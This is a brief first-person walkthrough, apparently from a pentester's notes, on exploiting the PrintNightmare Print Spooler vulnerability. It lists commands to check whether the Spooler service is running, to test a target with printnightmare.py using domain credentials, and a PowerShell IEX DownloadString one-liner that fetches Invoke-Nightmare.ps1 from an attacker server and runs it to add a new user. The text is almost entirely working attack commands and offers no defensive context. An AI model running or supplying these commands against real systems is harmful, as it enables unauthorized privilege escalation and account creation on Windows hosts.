# <h1 align="center" id="heading">PrintNightmare</h1>
There are some conditions that need to be met in order for this attack to be successful. The first and most important is that I have valid domain credentials to the system. Having domain credentials will allow me to remotely check to see if the system is vulnerable or not. The Print Spooler service also needs to be running on the target system in order for this attack to be successful. I can check to see if Print Spooler is available on the target system with the following PowerShell command:
```powershell
Get-Service -Name Spooler
```
If the service is accessible, I can run the following command from my Kali instance to check if the target is vulnerable or not:
```console
python3 printnightmare.py -check '<user>:<password>@<target ip>'
```
I can also list the available drivers with the following command. This step is optional!
```console
python3 printnightmare.py -list '<user>:<password>@<target ip>'
```
If the system is vulnerable, I can run the following PowerShell command to complete the exploit:
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<attacker server>/Invoke-Nightmare.ps1');Invoke-Nightmare -DriverName "Xerox" -NewUser "<username>" -NewPassword "<password>"
```
This is a quick and easy win if all of the right conditions are met within the target environment.
